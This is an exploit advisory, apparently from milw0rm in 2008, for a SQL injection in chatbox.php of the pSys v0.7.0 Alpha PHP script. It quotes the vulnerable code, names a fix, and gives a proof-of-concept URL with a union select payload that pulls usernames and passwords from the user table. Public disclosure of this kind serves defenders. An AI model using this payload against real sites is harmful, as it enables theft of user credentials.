@@ -1,0 +1,31 @@
+                             \#'#/
+                             (-.-)
+   ---------------------oOO---(_)---OOo--------------------
+   | pSys v0.7.0 Alpha (chatbox.php) Remote SQL Injection |
+   |           (works only with magic quotes = off)       |
+   |                     coded by DNX                     |
+   --------------------------------------------------------
+[!] Discovered.: DNX
+[!] Vendor.....: http://www.powie.de
+[!] Detected...: 22.06.2008
+[!] Reported...: 23.06.2008
+[!] Response...: 23.06.2008
+
+[!] Background.: pSys is a module based PHP Script
+
+[!] Bug........: $showid in chatbox.php near line 42
+
+                 12: $showid = $_REQUEST['showid']; //Einzelne ID anzeigen
+
+                 41: if ($showid != '') {
+                 42:     $sqlbefehl = "Select * FROM $tab_quick where id='$showid'";
+
+[!] PoC........: http://127.0.0.1/psys/chatbox.php?showid=' union select 1,username,pwd,4,5,6,7,8 FROM ps_pfuser/*
+
+                 "ps_" is default database prefix
+
+[!] Solution...: Install updates from cvs (http://www.powie.de/cvsout)
+
+[!] Greetingz..: h0yt3r, k1tk4t, pwndomina, e\o, daneo
+
+# milw0rm.com [2008-06-30]
